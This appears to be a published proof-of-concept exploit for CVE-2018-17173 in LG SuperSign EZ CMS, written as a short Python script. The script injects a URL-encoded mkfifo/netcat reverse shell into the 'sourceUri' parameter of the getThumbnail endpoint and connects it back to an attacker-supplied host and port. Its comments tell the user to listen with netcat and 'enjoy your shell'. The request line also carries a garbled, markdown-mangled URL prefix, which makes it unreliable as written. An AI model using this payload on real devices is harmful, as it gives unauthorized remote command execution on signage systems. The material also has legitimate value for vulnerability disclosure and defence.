# Exploit Title: LG SuperSign EZ CMS 2.5 - Remote Code Execution
# Date: 2018-09-18
# Exploit Author: Alejandro Fanjul
# Vendor Homepage:https://www.lg.com
# Software Link: https://www.lg.com/ar/software-lg-supersign
# Version: SuperSignEZ 1.3
# Tested on: LG WebOS 3.10
# CVE : CVE-2018-17173

# 1. Description
# LG SuperSignEZ CMS, that many LG SuperSign TVs have built in, is prone
# to remote code execution due to an improper parameter handling

# 2. Proof of concept
# Code to exploit the vulnerability

import requests
from argparse import ArgumentParser

parser = ArgumentParser(description="SuperSign RCE")
parser.add_argument("-t", "--target", dest="target",
                        help="Target")
parser.add_argument("-l", "--lhost", dest="lhost",
                        help="lhost")
parser.add_argument("-p", "--lport", dest="lport",
                        help="lport")

args = parser.parse_args()

#LG SupersignEZ always run in port 9080, so in target you must type: #LG_SuperSign_IP:9080
#Example
#supersign-exploit.py -t LG_SuperSign_IP:9080 -l attacker_ip -p 4444
#In the attacker machine wait for the shell with nc -lvp 4444
#enjoy your shell

s = requests.get('[http://'+](http://%27+/) str(args.target).replace('\n', '') +'/qsr_server/device/getThumbnail?sourceUri=\'%20-;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20'+str(args.lhost)+'%20'+str(args.lport)+'%20%3E%2Ftmp%2Ff;\'&targetUri=%2Ftmp%2Fthumb%2Ftest.jpg&mediaType=image&targetWidth=400&targetHeight=400&scaleType=crop&_=1537275717150')